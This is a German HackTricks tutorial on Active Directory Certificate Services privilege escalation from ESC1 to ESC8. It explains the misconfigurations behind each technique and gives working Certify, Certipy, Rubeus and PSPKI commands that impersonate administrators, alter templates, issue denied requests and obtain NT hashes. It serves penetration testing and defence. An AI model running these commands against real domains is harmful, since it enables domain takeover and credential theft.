# AD CS Domänen-Eskalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Eskalationstechniken in den folgenden Beiträgen:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Zertifikatvorlagen - ESC1

### Erklärung

### Fehlkonfigurierte Zertifikatvorlagen - ESC1 erklärt

- **Einschreiberechte werden von der Enterprise CA an niedrigprivilegierte Benutzer vergeben.**
- **Eine Genehmigung durch einen Manager ist nicht erforderlich.**
- **Unterschriften autorisierten Personals sind nicht erforderlich.**
- **Sicherheitsdeskriptoren auf Zertifikatvorlagen sind zu großzügig und erlauben niedrigprivilegierten Benutzern, Einschreiberechte zu erhalten.**
- **Zertifikatvorlagen sind so konfiguriert, dass EKUs definiert werden, die die Authentifizierung ermöglichen:**
- Extended Key Usage (EKU)-Kennungen wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder kein EKU (SubCA) sind enthalten.
- **Die Vorlage erlaubt Anfragenden, einen subjectAltName im Certificate Signing Request (CSR) anzugeben:**
- Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat für die Identitätsprüfung, falls dieser vorhanden ist. Das bedeutet, dass durch das Angeben des SAN in einer CSR ein Zertifikat angefordert werden kann, um sich als beliebiger Benutzer (z. B. ein Domain-Administrator) auszugeben. Ob ein Antragsteller einen SAN angeben kann, wird im AD-Objekt der Zertifikatvorlage durch die Eigenschaft `mspki-certificate-name-flag` angezeigt. Diese Eigenschaft ist eine Bitmaske, und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt dem Antragsteller, den SAN anzugeben.

> [!CAUTION]
> Die beschriebene Konfiguration erlaubt niedrigprivilegierten Benutzern, Zertifikate mit beliebigem SAN anzufordern, wodurch eine Authentifizierung als beliebiges Domain-Principal über Kerberos oder SChannel möglich wird.

Dieses Feature ist manchmal aktiviert, um die on-the-fly-Erzeugung von HTTPS- oder Host-Zertifikaten durch Produkte oder Deployment-Services zu unterstützen, oder aufgrund von Unkenntnis.

Es sei angemerkt, dass das Erstellen eines Zertifikats mit dieser Option eine Warnung auslöst, was nicht der Fall ist, wenn eine vorhandene Zertifikatvorlage (wie die `WebServer`-Vorlage, die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert hat) dupliziert und anschließend so geändert wird, dass sie eine Authentifizierungs-OID enthält.

### Missbrauch

Um **verwundbare Zertifikatvorlagen** zu finden, können Sie ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um **diese Schwachstelle auszunutzen, um sich als Administrator auszugeben**, könnte man Folgendes ausführen:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Anschließend kannst du das erzeugte Zertifikat in das `.pfx`-Format umwandeln und es erneut zur Authentifizierung mit Rubeus oder certipy verwenden:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binaries "Certreq.exe" & "Certutil.exe" können verwendet werden, um die PFX zu generieren: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Enumeration der Zertifikatsvorlagen innerhalb des AD Forest-Konfigurationsschemas — speziell solcher, die keine Genehmigung oder Signaturen benötigen, ein Client Authentication- oder Smart Card Logon EKU besitzen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` gesetzt ist — kann durch Ausführen der folgenden LDAP-Abfrage durchgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Zertifikatvorlagen - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Enrollment-Rechte werden vom Enterprise CA an niedrig privilegierte Benutzer vergeben.
2. Die Anforderung einer Genehmigung durch Vorgesetzte ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen wurde weggelassen.
4. Ein zu permissiver Security Descriptor auf der Zertifikatvorlage gewährt niedrig privilegierten Benutzern Enrollment-Rechte für Zertifikate.
5. **Die Zertifikatvorlage ist so definiert, dass sie die Any Purpose EKU enthält oder kein EKU besitzt.**

Die **Any Purpose EKU** erlaubt einem Angreifer, ein Zertifikat für **beliebige Zwecke** zu erhalten, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code-Signierung usw. Dieselbe **Technik wie bei ESC3** kann verwendet werden, um dieses Szenario auszunutzen.

Zertifikate mit **no EKUs**, die als untergeordnete CA-Zertifikate fungieren, können für **beliebige Zwecke** missbraucht werden und **auch zum Signieren neuer Zertifikate verwendet werden**. Folglich könnte ein Angreifer durch Verwendung eines untergeordneten CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten festlegen.

Allerdings funktionieren neu erstellte Zertifikate für **domain authentication** nicht, wenn das untergeordnete CA nicht vom Objekt **`NTAuthCertificates`** vertraut wird, was die Standardeinstellung ist. Nichtsdestotrotz kann ein Angreifer weiterhin **neue Zertifikate mit any EKU** und beliebigen Zertifikatswerten erstellen. Diese könnten potenziell für eine Vielzahl von Zwecken **missbraucht** werden (z. B. Code-Signierung, Server-Authentifizierung usw.) und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.

Um Vorlagen zu enumerieren, die diesem Szenario innerhalb des Konfigurationsschemas des AD Forests entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrolment Agent-Vorlagen - ESC3

### Erklärung

Dieses Szenario ist ähnlich wie das erste und zweite, aber mit dem **Missbrauch** einer **anderen EKU** (Certificate Request Agent) und **2 unterschiedlicher Vorlagen** (daher gibt es 2 Anforderungssätze),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, erlaubt einer Identität, für ein **Zertifikat** **im Namen eines anderen Benutzers** zu **beantragen**.

Der **„enrollment agent“** meldet sich für eine solche **Vorlage** an und verwendet das resultierende **Zertifikat, um eine CSR im Namen des anderen Benutzers mitzuunterzeichnen**. Anschließend **sendet** er die **mitunterzeichnete CSR** an die CA, beantragt eine **Vorlage**, die das **„enroll on behalf of“** erlaubt, und die CA antwortet mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.

**Anforderungen 1:**

- Die Enterprise CA gewährt niedrig privilegierten Benutzern Registrierungsrechte.
- Die Anforderung einer Manager-Genehmigung wurde weggelassen.
- Keine Anforderung für autorisierte Signaturen.
- Der Sicherheitsdeskriptor der Zertifikatvorlage ist übermäßig permissiv und gewährt niedrig privilegierten Benutzern Registrierungsrechte.
- Die Zertifikatvorlage enthält die Certificate Request Agent EKU, wodurch das Anfordern anderer Zertifikatvorlagen im Namen anderer Principals ermöglicht wird.

**Anforderungen 2:**

- Die Enterprise CA gewährt niedrig privilegierten Benutzern Registrierungsrechte.
- Die Manager-Genehmigung wird umgangen.
- Die Schema-Version der Vorlage ist entweder 1 oder größer als 2, und sie spezifiziert ein Application Policy Issuance Requirement, das die Certificate Request Agent EKU erfordert.
- Eine in der Zertifikatvorlage definierte EKU erlaubt Domänen-Authentifizierung.
- Einschränkungen für Enrollment Agents werden auf der CA nicht angewendet.

### Missbrauch

Sie können [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, denen es erlaubt ist, ein **Enrollment-Agent-Zertifikat** zu **erhalten**, die Vorlagen, in die sich Enrollment **Agenten** eintragen dürfen, und die **Konten**, in deren Namen der Enrollment-Agent handeln darf, können von Enterprise-CAs eingeschränkt werden. Dies wird erreicht, indem das `certsrc.msc` **snap-in** geöffnet, **mit der rechten Maustaste auf die CA geklickt**, **Properties** ausgewählt und dann zur Registerkarte “Enrollment Agents” navigiert wird.

Es ist jedoch zu beachten, dass die **Standard**einstellung für CAs „**Do not restrict enrollment agents**“ ist. Wenn die Einschränkung der Enrollment-Agenten durch Administratoren aktiviert und auf „Restrict enrollment agents“ gesetzt wird, bleibt die Standardkonfiguration extrem permissiv. Sie erlaubt **Everyone** den Zugriff, in allen Vorlagen im Namen beliebiger Benutzer ein Zertifikat zu beantragen.

## Verwundbare Zugriffssteuerung für Zertifikatvorlagen - ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** auf **Zertifikatvorlagen** definiert die **Berechtigungen**, die spezifische **AD-Prinzipale** in Bezug auf die Vorlage besitzen.

Sollte ein **Angreifer** über die erforderlichen **Berechtigungen** verfügen, eine **Vorlage** zu **ändern** und eine der in vorherigen Abschnitten beschriebenen ausnutzbaren Fehlkonfigurationen **einzuführen**, könnte dies eine Privilegieneskalation ermöglichen.

Wesentliche Berechtigungen, die auf Zertifikatvorlagen anwendbar sind, umfassen:

- **Owner:** Ermöglicht implizite Kontrolle über das Objekt und gestattet die Änderung beliebiger Attribute.
- **FullControl:** Gewährt vollständige Autorität über das Objekt, einschließlich der Möglichkeit, alle Attribute zu ändern.
- **WriteOwner:** Erlaubt die Änderung des Besitzers des Objekts zu einem vom Angreifer kontrollierten Prinzipal.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen, wodurch einem Angreifer ggf. FullControl gewährt werden kann.
- **WriteProperty:** Autorisiert das Bearbeiten beliebiger Objekteigenschaften.

### Missbrauch

Um Prinzipsale mit Bearbeitungsrechten an Vorlagen und anderen PKI-Objekten zu identifizieren, mit Certify enumerieren:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ein Beispiel für eine privesc wie das vorherige:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ist, wenn ein Benutzer Schreibrechte für eine Zertifikatvorlage hat. Dies kann beispielsweise missbraucht werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und die Vorlage gegenüber ESC1 verwundbar zu machen.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Rechte, aber unser Benutzer `JOHN` hat die neue `AddKeyCredentialLink` edge zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist. Hier ein kleiner Vorgeschmack auf Certipy’s `shadow auto`-Befehl, um den NT hash des Opfers zu erhalten.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. Standardmäßig wird Certipy die Konfiguration **überschreiben**, um sie **anfällig für ESC1** zu machen. Wir können auch den **`-save-old` Parameter zum Speichern der alten Konfiguration** angeben, was nützlich für das **Wiederherstellen** der Konfiguration nach unserem Angriff ist.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Verwundbare PKI-Objektzugriffskontrolle - ESC5

### Erläuterung

Das umfangreiche Netz miteinander verbundener, ACL-basierter Beziehungen, das mehrere Objekte über Certificate Templates und die Certificate Authority hinaus einschließt, kann die Sicherheit des gesamten AD CS-Systems beeinflussen. Diese Objekte, die die Sicherheit erheblich beeinträchtigen können, umfassen:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Den RPC/DCOM-Server des CA-Servers.
- Jedes nachgeordnete AD-Objekt oder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Certificate Templates container, den Certification Authorities container, das NTAuthCertificates-Objekt und den Enrollment Services Container.

Die Sicherheit des PKI-Systems kann gefährdet sein, wenn ein gering privilegierter Angreifer Kontrolle über eine dieser kritischen Komponenten erlangt.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erläuterung

Der in dem [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Sachverhalt geht auch auf die Auswirkungen des **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-Flags ein, wie Microsoft sie beschreibt. Diese Konfiguration erlaubt es einer Certification Authority (CA), benutzerdefinierte Werte in den **subject alternative name** für **jede Anfrage** aufzunehmen, einschließlich solcher, die aus Active Directory® erstellt werden. Folglich kann ein **Angreifer** sich über **jedes Template** anmelden, das für die Domänen**authentifizierung** konfiguriert ist — insbesondere solche, die die Anmeldung durch **nicht privilegierte** Benutzer zulassen, wie das Standard-User-Template. Dadurch kann ein Zertifikat erlangt werden, das dem Angreifer erlaubt, sich als Domain-Administrator oder als **jede andere aktive Entität** innerhalb der Domäne zu authentifizieren.

**Hinweis**: Der Ansatz, **alternative names** in eine Certificate Signing Request (CSR) einzufügen, über das `-attrib "SAN:"`-Argument in `certreq.exe` (als „Name-Wert-Paare“ bezeichnet), unterscheidet sich von der Ausnutzungsstrategie von SANs in ESC1. Der Unterschied liegt hier darin, **wie Kontoinformationen gekapselt werden** — in einem Zertifikat-Attribut statt in einer Extension.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Diese Operation verwendet im Wesentlichen **remote registry access**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) sind in der Lage, diese Fehlkonfiguration zu erkennen und auszunutzen:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern — vorausgesetzt, man besitzt **Domänen-Administratorrechte** oder ein gleichwertiges Recht — kann der folgende Befehl von jeder Workstation ausgeführt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das flag wie folgt entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nach den Security-Updates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die **`objectSid`-Eigenschaft des Antragstellers** einbindet. Bei ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** hingegen spiegelt die SID die **`objectSid` des Antragstellers** wider, nicht das SAN.\
> Um ESC6 auszunutzen, muss das System für ESC10 (Weak Certificate Mappings) anfällig sein, das die **SAN über die neue Sicherheitserweiterung** priorisiert.

## Verwundbare Zugriffskontrolle der Zertifizierungsstelle - ESC7

### Angriff 1

#### Erklärung

Die Zugriffskontrolle für eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen geregelt, die CA-Aktionen steuern. Diese Berechtigungen können eingesehen werden, indem man `certsrv.msc` öffnet, mit der rechten Maustaste auf eine CA klickt, Eigenschaften wählt und dann zur Registerkarte Sicherheit navigiert. Zusätzlich können Berechtigungen mit dem PSPKI-Modul anhand von Befehlen wie folgt aufgelistet werden:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies liefert Einblicke in die primären Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die jeweils den Rollen „CA-Administrator“ und „Zertifikatsmanager“ entsprechen.

#### Missbrauch

Das Besitzen von **`ManageCA`**-Rechten auf einer Certificate Authority ermöglicht dem Principal, Einstellungen remote mit PSPKI zu manipulieren. Dazu gehört das Umschalten des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe von SAN in beliebigen Templates zu erlauben — ein kritischer Aspekt bei der Domain-Eskalation.

Die Vereinfachung dieses Prozesses ist mittels PSPKI’s **Enable-PolicyModuleFlag** cmdlet möglich, wodurch Änderungen ohne direkte GUI-Interaktion vorgenommen werden können.

Der Besitz von **`ManageCertificates`**-Rechten ermöglicht die Genehmigung ausstehender Anfragen und umgeht damit effektiv die "CA certificate manager approval"-Sicherung.

Eine Kombination der Module **Certify** und **PSPKI** kann verwendet werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

> [!WARNING]
> Im **vorherigen Angriff** wurden **`Manage CA`**-Berechtigungen verwendet, um das **EDITF_ATTRIBUTESUBJECTALTNAME2**-Flag zu **aktivieren**, um die **ESC6 attack** auszuführen, aber dies hat keine Wirkung, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer das Zugriffsrecht `Manage CA` hat, darf der Benutzer außerdem den **Dienst neu starten**. Das bedeutet jedoch **nicht, dass der Benutzer den Dienst remote neu starten kann**. Außerdem könnte **ESC6** in den meisten gepatchten Umgebungen aufgrund der Sicherheitsupdates vom Mai 2022 **nicht ohne Weiteres funktionieren**.

Daher wird hier ein anderer Angriff vorgestellt.

Voraussetzungen:

- Nur die **`ManageCA`**-Berechtigung
- Die **`Manage Certificates`**-Berechtigung (kann von **`ManageCA`** gewährt werden)
- Das Zertifikat-Template **`SubCA`** muss **aktiviert** sein (kann über **`ManageCA`** aktiviert werden)

Die Technik beruht auf der Tatsache, dass Benutzer mit den Zugriffsrechten `Manage CA` _und_ `Manage Certificates` fehlgeschlagene Zertifikatsanfragen **ausstellen** können. Das Zertifikat-Template **`SubCA`** ist **anfällig für ESC1**, aber **nur Administratoren** können sich für das Template anmelden. Daher kann ein **Benutzer** eine **Anmeldung** zur **`SubCA`** **anfordern** — diese wird **abgelehnt** — aber anschließend vom Manager **ausgestellt** werden.

#### Missbrauch

Sie können sich selbst das Zugriffsrecht **`Manage Certificates`** gewähren, indem Sie Ihren Benutzer als neuen Officer hinzufügen.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-Vorlage kann auf der CA mit dem Parameter `-enable-template` aktiviert werden. Standardmäßig ist die **`SubCA`**-Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir damit beginnen, **ein Zertifikat anzufordern, das auf der `SubCA`-Vorlage basiert**.

**Diese Anfrage wird abgelehnt**, aber wir speichern den privaten Schlüssel und notieren uns die Request-ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unseren **`Manage CA` und `Manage Certificates`** können wir dann **die fehlgeschlagene Zertifikatsanforderung ausstellen**, mit dem Befehl `ca` und dem Parameter `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir mit dem `req`-Befehl und dem Parameter `-retrieve <request ID>` **das ausgestellte Zertifikat abrufen**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Angriff 3 – Manage Certificates Extension Abuse (SetExtension)

#### Erklärung

Zusätzlich zu den klassischen ESC7-Abusen (Aktivieren von EDITF-Attributen oder Genehmigen ausstehender Anfragen) enthüllte **Certify 2.0** eine brandneue Primitive, die nur die *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) Rolle auf der Enterprise CA erfordert.

Die RPC-Methode `ICertAdmin::SetExtension` kann von jedem Principal ausgeführt werden, der *Manage Certificates* besitzt. Während die Methode traditionell von legitimen CAs verwendet wurde, um Erweiterungen an **ausstehenden** Anfragen zu aktualisieren, kann ein Angreifer sie missbrauchen, um eine **nicht-standardmäßige** Zertifikatserweiterung anzuhängen (zum Beispiel eine benutzerdefinierte *Certificate Issuance Policy* OID wie `1.1.1.1`) an eine Anfrage, die auf Genehmigung wartet.

Da die angezielte Vorlage **keinen Standardwert für diese Erweiterung definiert**, wird die CA den vom Angreifer kontrollierten Wert NICHT überschreiben, wenn die Anfrage schließlich ausgestellt wird. Das resultierende Zertifikat enthält daher eine vom Angreifer gewählte Erweiterung, die:

* Anforderungen an Application / Issuance Policy anderer verwundbarer Vorlagen erfüllen kann (was zu Privilegieneskalation führt).
* Zusätzliche EKUs oder Richtlinien injizieren kann, die dem Zertifikat unerwartetes Vertrauen in Drittanbietersystemen gewähren.

Kurz gesagt: *Manage Certificates* – zuvor als der „weniger mächtige“ Teil von ESC7 betrachtet – kann nun für vollständige Privilegieneskalation oder langfristige Persistenz genutzt werden, ohne die CA-Konfiguration zu verändern oder das restriktivere *Manage CA*-Recht zu benötigen.

#### Missbrauch der Primitive mit Certify 2.0

1. **Reiche eine Zertifikatsanfrage ein, die *ausstehend* bleibt.** Dies kann mit einer Vorlage erzwungen werden, die Manager-Genehmigung erfordert:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Hänge eine benutzerdefinierte Erweiterung an die ausstehende Anfrage an** mit dem neuen `manage-ca`-Befehl:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Wenn die Vorlage die *Certificate Issuance Policies*-Erweiterung nicht bereits definiert, wird der obige Wert nach der Ausstellung erhalten bleiben.*

3. **Stelle die Anfrage aus** (wenn deine Rolle auch Genehmigungsrechte für *Manage Certificates* hat) oder warte, bis ein Operator sie genehmigt. Nach der Ausstellung lade das Zertifikat herunter:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Das resultierende Zertifikat enthält nun die bösartige issuance-policy OID und kann in nachfolgenden Angriffen verwendet werden (z. B. ESC13, Domain-Eskalation usw.).

> NOTE:  Der gleiche Angriff kann mit Certipy ≥ 4.7 über den `ca`-Befehl und den Parameter `-set-extension` ausgeführt werden.

## NTLM Relay zu AD CS HTTP-Endpunkten – ESC8

### Erklärung

> [!TIP]
> In Umgebungen, in denen **AD CS installiert** ist, wenn ein verwundbarer **Web-Enrollment-Endpunkt** vorhanden ist und mindestens eine **certificate template** veröffentlicht ist, die **domain computer enrollment and client authentication** erlaubt (wie die Standard-**`Machine`**-Vorlage), kann **jeder Computer mit aktivem Spooler-Dienst von einem Angreifer kompromittiert werden**!

Mehrere HTTP-basierte Enrollment-Methoden werden von AD CS unterstützt und sind über zusätzliche Serverrollen verfügbar, die Administratoren installieren können. Diese Schnittstellen für HTTP-basiertes Certificate Enrollment sind anfällig für **NTLM relay attacks**. Ein Angreifer kann von einer kompromittierten Maschine aus jedes AD-Konto impersonifizieren, das sich über eingehendes NTLM authentifiziert. Während der Angreifer das Opferkonto impersonifiziert, kann er diese Webschnittstellen nutzen, um ein Client-Authentication-Zertifikat mithilfe der `User`- oder `Machine`-certificate templates anzufordern.

- Die **web enrollment interface** (eine ältere ASP-Anwendung verfügbar unter `http://<caserver>/certsrv/`) verwendet standardmäßig nur HTTP, was keinen Schutz gegen NTLM relay attacks bietet. Zusätzlich erlaubt sie explizit nur NTLM-Authentifizierung über ihren Authorization HTTP-Header, wodurch sicherere Authentifizierungsmethoden wie Kerberos unbrauchbar werden.
- Der **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service und **Network Device Enrollment Service** (NDES) unterstützen standardmäßig negotiate-Authentifizierung über ihren Authorization HTTP-Header. Negotiate-Authentifizierung **unterstützt sowohl** Kerberos als auch **NTLM**, wodurch ein Angreifer während Relay-Angriffen auf NTLM abwerten kann. Obwohl diese Webdienste standardmäßig HTTPS aktivieren, schützt HTTPS allein **nicht vor NTLM relay attacks**. Schutz vor NTLM-Relay-Angriffen für HTTPS-Dienste ist nur möglich, wenn HTTPS mit Channel Binding kombiniert wird. Leider aktiviert AD CS Extended Protection for Authentication in IIS nicht, welches für Channel Binding erforderlich ist.

Ein häufiges **Problem** bei NTLM relay attacks ist die **kurze Dauer von NTLM-Sitzungen** und die Unmöglichkeit für den Angreifer, mit Diensten zu interagieren, die **NTLM signing** verlangen.

Diese Einschränkung lässt sich jedoch umgehen, indem ein NTLM-Relay-Angriff ausgenutzt wird, um ein Zertifikat für den Benutzer zu erhalten, da die Gültigkeitsdauer des Zertifikats die Sitzungslänge bestimmt und das Zertifikat bei Diensten verwendet werden kann, die **NTLM signing** verlangen. Anweisungen zur Nutzung eines gestohlenen Zertifikats findest du unter:

{{#ref}}
account-persistence.md
{{#endref}}

